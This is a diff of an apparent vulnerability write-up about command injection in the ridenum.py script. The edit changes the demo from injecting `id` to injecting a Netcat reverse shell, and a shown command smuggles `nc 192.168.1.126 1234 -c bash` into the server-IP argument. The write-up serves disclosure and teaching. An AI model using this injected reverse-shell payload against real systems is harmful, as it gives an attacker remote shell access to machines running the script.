@@ -45,7 +45,7 @@ Usage: ./ridenum.py <server_ip> <start_rid> <end_rid> <optional_username> <optio
 ```
 As I said before, doing this via command line arguments is a little tricker. One would expect that all they would have to do is excute the following command `./ridenum.py 10.10.10.10;id; 100 1000 0v3rride`. This doesn't work, because all you're doing is terminating the `ridenum.py` script prematurely without giving it all of the required arguments, calling the bash command `id` and then specifying abunch of crap after the fact that has no meaning in bash (`100 1000 0v3rride`). Take a look at point two again above and notice the keyword 'string'.
 
-Let's execute ridenum and inject the bash command `id`.
+Let's execute ridenum and inject a Netcat command to give us a reverse shell.
 ```
 ./ridenum.py "1.1.1.1; nc 192.168.1.126 1234 -c bash;" 0 3 "0v3rride" "mysecretpassword"
 ```
